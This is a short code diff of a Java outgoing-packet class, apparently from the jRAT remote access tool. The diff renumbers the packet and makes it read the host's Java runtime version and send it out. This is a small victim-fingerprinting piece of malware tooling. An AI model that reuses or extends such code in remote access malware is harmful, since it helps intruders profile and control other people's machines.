@@ -5,22 +5,18 @@ import java.io.DataOutputStream;
 import se.jrat.common.io.StringWriter;
 
 
-public class Packet25InitJavaVersion extends AbstractOutgoingPacket {
-
-	private String version;
-
-	public Packet25InitJavaVersion(String version) {
-		this.version = version;
-	}
+public class Packet9InitJavaVersion extends AbstractOutgoingPacket {
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
+		String version = System.getProperty("java.runtime.version");
+		
 		sw.writeLine(version);
 	}
 
 	@Override
 	public byte getPacketId() {
-		return (byte) 25;
+		return (byte) 9;
 	}
 
 }
